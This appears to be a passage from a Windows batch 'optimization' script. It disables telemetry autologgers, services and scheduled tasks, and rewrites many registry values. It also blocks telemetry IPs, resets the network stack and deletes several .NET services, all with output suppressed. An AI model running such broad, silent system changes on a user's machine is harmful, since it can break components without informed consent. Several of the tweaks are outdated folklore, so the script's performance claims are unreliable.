Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\NBSMBLOGGER" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\PEAuthLog" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\RdrLog" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\ReadyBoot" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SetupPlatform" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SetupPlatformTel" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SocketHeciServer" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SpoolerLogger" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SQMLogger" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\TCPIPLOGGER" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\TileStore" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Tpm" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\TPMProvisioningService" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\UBPM" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WdiContextLog" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WFP-IPsec Trace" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WiFiDriverIHVSession" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WiFiDriverIHVSessionRepro" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WiFiSession" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WinPhoneCritical" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
echo Tweaking services
sc config FontCache start=auto > nul
sc config RemoteAccess start= disabled > nul
sc config RemoteRegistry start= disabled > nul

sc config AJRouter start= demand > nul
sc config ALG start= demand > nul
sc config AppIDSvc start= demand > nul
sc config AppMgmt start= demand > nul
sc config AppReadiness start= demand > nul
sc config AppVClient start= demand > nul
sc config AppXSvc start= demand > nul
sc config Appinfo start= demand > nul
sc config AssignedAccessManagerSvc start= demand > nul
sc config AxInstSV start= demand > nul
sc config BDESVC start= demand > nul
sc config BFE start= demand > nul
sc config BTAGService start= demand > nul
sc config CertPropSvc start= demand > nul
sc config FontCache3.0.0.0 start=demand > nul
sc config p2psvc start= demand > nul
sc config PhoneSvc start= demand > nul
sc config WaaSMedicSvc start=demand > nul
sc config WalletService start= demand > nul
sc config WSearch start= demand > nul
sc config SCPolicySvc start= demand > nul
sc config spectrum start=demand > nul
sc config wcncsvc start=demand > nul
sc config lmhosts start=demand > nul
sc config XboxGipSvc start=demand > nul



Echo Telemetry tweaks
sc config diagtrack start= disabled > nul
sc config diagnosticshub.standardcollector.service start= disabled > nul
sc config dmwappushservice start= disabled > nul
sc config NvTelemetryContainer start= disabled > nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowDeviceNameInTelemetry" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\TabletPC" /v "PreventHandwritingDataSharing" /t REG_DWORD /d "1" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Error Reporting" /v "DontSendAdditionalData" /t REG_DWORD /d "1" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\HandwritingErrorReports" /v "PreventHandwritingErrorReports" /t REG_DWORD /d "1" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v "DisableInventory" /t REG_DWORD /d "1" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v "DisableUAR" /t REG_DWORD /d "1" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Input\TIPC" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\current\device\System" /v "AllowExperimentation" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\current\device\Bluetooth" /v "AllowAdvertising" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Microsoft\SQMClient\Windows" /v "CEIPEnable" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Messaging" /v "AllowMessageSync" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Biometrics" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverSearching" /v SearchOrderConfig /t REG_DWORD /d 0 /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" /v MaintenanceDisabled /t REG_DWORD /d 1 /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v "ToastEnabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" /v "EnableWebContentEvaluation" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Start_TrackProgs" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowSyncProviderNotifications" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Personalization" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\BrowserSettings" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Credentials" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Accessibility" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Windows" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338393Enabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-353694Enabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-353696Enabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338387Enabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338389Enabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-310093Enabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338388Enabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-314563Enabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "RotatingLockScreenOverlayEnabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "RotatingLockScreenEnabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "ContentDeliveryAllowed" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "OemPreInstalledAppsEnabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "PreInstalledAppsEnabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "PreInstalledAppsEverEnabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SilentInstalledAppsEnabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SoftLandingEnabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContentEnabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "FeatureManagementEnabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SystemPaneSuggestionsEnabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "RemediationRequired" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\DeviceAccess\Global\{C1D23ACC-752B-43E5-8448-8D0E519CD6D6}" /v "Value" /t REG_SZ /d "Deny" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\DeviceAccess\Global\{2297E4E2-5DBE-466D-A12B-0F8286F0D9CA}" /v "Value" /t REG_SZ /d "Deny" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\DeviceAccess\Global\{E5323777-F976-4f5b-9B55-B94699C46E44}" /v "Value" /t REG_SZ /d "Deny" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\DeviceAccess\Global\{2EEF81BE-33FA-4800-9670-1CD474972C3F}" /v "Value" /t REG_SZ /d "Deny" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\DeviceAccess\Global\{52079E78-A92B-413F-B213-E8FE35712E72}" /v "Value" /t REG_SZ /d "Deny" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\DeviceAccess\Global\{7D7E8402-7C54-4821-A34E-AEEFD62DED93}" /v "Value" /t REG_SZ /d "Deny" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\DeviceAccess\Global\{D89823BA-7180-4B81-B50C-7E471E6121A3}" /v "Value" /t REG_SZ /d "Deny" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\DeviceAccess\Global\{8BC668CF-7728-45BD-93F8-CF2B3B41D7AB}" /v "Value" /t REG_SZ /d "Deny" /f > nul 2>&1
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\DeviceAccess\Global\{9231CB4C-BF57-4AF3-8C55-FDA7BFCC04C5}" /v "Value" /t REG_SZ /d "Deny" /f > nul 2>&1
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\DeviceAccess\Global\{E390DF20-07DF-446D-B962-F5C953062741}" /v "Value" /t REG_SZ /d "Deny" /f > nul 2>&1
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\DeviceAccess\Global\{992AFA70-6F47-4148-B3E9-3003349C1548}" /v "Value" /t REG_SZ /d "Deny" /f > nul 2>&1
Reg.exe add "HKCU\SOFTWARE\Classes\Local Settings\SOFTWARE\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\MicrosoftEdge\Main" /v "DoNotTrack" /t REG_DWORD /d "1" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Classes\Local Settings\SOFTWARE\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\MicrosoftEdge\Main" /v "OptimizeWindowsSearchResultsForScreenReaders" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Classes\Local Settings\SOFTWARE\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\MicrosoftEdge\FlipAhead" /v "FPEnabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Classes\Local Settings\SOFTWARE\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\MicrosoftEdge\User\Default\SearchScopes" /v "ShowSearchSuggestionsGlobal" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userNotificationListener" /v "Value" /t REG_SZ /d "Deny" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location" /v "Value" /t REG_SZ /d "Deny" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\appDiagnostics" /v "Value" /t REG_SZ /d "Deny" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userAccountInformation" /v "Value" /t REG_SZ /d "Deny" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AdvertisingInfo" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AdvertisingInfo" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" /v "EnableWebContentEvaluation" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Config" /v "DownloadMode" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Personalization\Settings" /v "AcceptedPrivacyPolicy" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\InputPersonalization" /v "RestrictImplicitInkCollection" /t REG_DWORD /d "1" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\InputPersonalization" /v "RestrictImplicitTextCollection" /t REG_DWORD /d "1" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\InputPersonalization\TrainedDataStore" /v "HarvestContacts" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack" /v "ShowedToastAtLevel" /t REG_DWORD /d "1" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync" /v "SyncPolicy" /t REG_DWORD /d "5" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Privacy" /v "TailoredExperiencesWithDiagnosticDataEnabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\EventTranscriptKey" /v "EnableEventTranscript" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\UserProfileEngagement" /v "ScoobeSystemSettingEnabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverSearching" /v "SearchOrderConfig" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "IncludeEnterpriseSpotlight" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\Control Panel\International\User Profile" /v "HttpAcceptLanguageOptOut" /t REG_DWORD /d "1" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Input\TIPC" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\MediaPlayer\Preferences" /v "UsageTracking" /t REG_DWORD /d "0" /f > nul 2>&1 
schtasks /change /disable /tn "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser" > nul 2>&1
schtasks /change /disable /tn "\Microsoft\Windows\Customer Experience Improvement Program\Consolidator" > nul 2>&1
schtasks /change /disable /tn "\Microsoft\Windows\Customer Experience Improvement Program\UsbCeip" > nul 2>&1
schtasks /change /disable /tn "\Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector" > nul 2>&1
schtasks /change /disable /tn "\Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents" > nul 2>&1
schtasks /change /disable /tn "\Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem" > nul 2>&1
schtasks /change /disable /tn "\Microsoft\Windows\Windows Error Reporting\QueueReporting" > nul 2>&1
schtasks /change /disable /tn "Microsoft\Windows\Device Information\Device" > nul 2>&1
netsh advfirewall firewall add rule name="Block Windows Telemetry" dir=in action=block remoteip=134.170.30.202,137.116.81.24,157.56.106.189,184.86.53.99,2.22.61.43,2.22.61.66,204.79.197.200,23.218.212.69,65.39.117.23,65.55.108.23,64.4.54.254 enable=yes > nul 2>&1
netsh advfirewall firewall add rule name="Block NVIDIA Telemetry" dir=in action=block remoteip=8.36.80.197,8.36.80.224,8.36.80.252,8.36.113.118,8.36.113.141,8.36.80.230,8.36.80.231,8.36.113.126,8.36.80.195,8.36.80.217,8.36.80.237,8.36.80.246,8.36.113.116,8.36.113.139,8.36.80.244,216.228.121.209 enable=yes > nul 2>&1
timeout 1 > nul
if exist "C:\Program Files\Riot Vanguard\vgc.exe" (
	powershell "Set-ProcessMitigation -Name vgc.exe -Enable CFG" > nul 2>&1
	powershell "Set-ProcessMitigation -Name vgc.exe -Enable DEF" > nul 2>&1
	powershell "Set-ProcessMitigation -Name vgc.exe -Enable AuditDynamicCode" > nul 2>&1
	bcdedit /set {current} nx OptIn > nul 2>&1
) else (
	goto inputdelay
)

:inputdelay
echo Input delay
Reg.exe add "HKCU\SOFTWARE\Microsoft\Siuf\Rules" /v "NumberOfSIUFInPeriod" /t REG_DWORD /d 0 /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Siuf\Rules" /v "PeriodInNanoSeconds" /t REG_DWORD /d 0 /f > nul 2>&1 
Reg.exe add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NoLazyMode" /t REG_DWORD /d "1" /f > nul 2>&1
Reg.exe add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "LazyModeTimeout" /t REG_DWORD /d "10000" /f > nul 2>&1
Reg.exe add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "NoLazyMode" /t REG_DWORD /d "1" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "PublishUserActivities" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "UploadUserActivities" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "6" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Affinity" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Background Only" /t REG_SZ /d "False" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Clock Rate" /t REG_DWORD /d "10000" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "GPU Priority" /t REG_DWORD /d "8" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Priority" /t REG_DWORD /d "2" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Scheduling Category" /t REG_SZ /d "High" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "SFIO Priority" /t REG_SZ /d "High" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Latency Sensitive" /t REG_SZ /d "True" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\GameBar" /v "AllowAutoGameMode" /t REG_DWORD /d "1" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\GameBar" /v "AutoGameModeEnabled" /t REG_DWORD /d "1" /f > nul 2>&1 
echo mouse tweaks
Reg.exe add "HKCU\Control Panel\Accessibility\MouseKeys" /v "Flags" /t REG_SZ /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\Control Panel\Accessibility\StickyKeys" /v "Flags" /t REG_SZ /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\Control Panel\Accessibility\ToggleKeys" /v "Flags" /t REG_SZ /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseSensitivity" /t REG_SZ /d "10" /f > nul 2>&1 
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseHoverTime" /t REG_SZ /d "200" /f > nul 2>&1 
Reg.exe add "HKU\.DEFAULT\Control Panel\Mouse" /v "MouseSpeed" /t REG_SZ /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "MouseDataQueueSize" /t REG_DWORD /d "32" /f > nul 2>&1 
Reg.exe add "HKCU\Control Panel\Mouse" /v "SmoothMouseXCurve" /t REG_BINARY /d "0000a0400100000800205000" /f > nul 2>&1 
Reg.exe add "HKCU\Control Panel\Mouse" /v "SmoothMouseYCurve" /t REG_BINARY /d "0066a602000cd4c05000a0990a000383315000" /f > nul 2>&1 
echo keyboard tweaks
Reg.exe add "HKCU\Control Panel\Keyboard" /v "KeyboardDelay" /t REG_SZ /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "Flags" /t REG_SZ /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\kbdclass\Parameters" /v "KeyboardDataQueueSize" /t REG_DWORD /d "32" /f > nul 2>&1 
Reg.exe add "HKLM\SYSTEM\ControlSet002\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "38" /f > nul 2>&1
echo.
echo Network tweaks
echo.   
echo Please wait your network is restarting
timeout 1 >nul
ipconfig /flushdns >nul 2>&1
ipconfig /release >nul 2>&1
netsh int ip reset >nul 2>&1
netsh int ipv4 reset >nul 2>&1
netsh int ipv6 reset >nul 2>&1
netsh int tcp reset >nul 2>&1
netsh winsock reset >nul 2>&1
netsh branchcache reset >nul 2>&1
netsh http flush logbuffer >nul 2>&1
ipconfig /renew >nul 2>&1
echo Network restared succefully^!		   

sc stop aspnet_state >nul 2>&1
sc stop clr_optimization_v2.0.50727_32 >nul 2>&1
sc stop clr_optimization_v2.0.50727_64 >nul 2>&1
sc stop clr_optimization_v4.0.30319_32 >nul 2>&1
sc stop clr_optimization_v4.0.30319_64 >nul 2>&1
sc delete aspnet_state >nul 2>&1
sc delete clr_optimization_v2.0.50727_32 >nul 2>&1
sc delete clr_optimization_v2.0.50727_64 >nul 2>&1
sc delete clr_optimization_v4.0.30319_32 >nul 2>&1
sc delete clr_optimization_v4.0.30319_64 >nul 2>&1

echo Applying netsh tweaks
timeout 1 > nul
echo.
echo.
netsh winsock set autotuning off > nul 2>&1
netsh int ip set interface ethernet currenthoplimit=64 > nul 2>&1
netsh int ip set global neighborcachelimit=4096 > nul 2>&1
netsh int ip set global routecachelimit=4096 > nul 2>&1
netsh int ip set global sourceroutingbehavior=drop > nul 2>&1
netsh int ip set global taskoffload=disabled > nul 2>&1
netsh int tcp set global ecncapability=disabled > nul 2>&1
netsh int tcp set global autotuninglevel=disabled > nul 2>&1
netsh int tcp set global congestionprovider=ctcp > nul 2>&1
netsh int tcp set global netdma=enabled > nul 2>&1
netsh int tcp set global dca=enabled > nul 2>&1
netsh int tcp set global rss=enabled > nul 2>&1
netsh int tcp set global chimney=disabled > nul 2>&1
netsh int tcp set global rsc=enabled > nul 2>&1
netsh int tcp set global nonsackrttresiliency=disabled > nul 2>&1
netsh int tcp set global maxsynretransmissions=2 > nul 2>&1
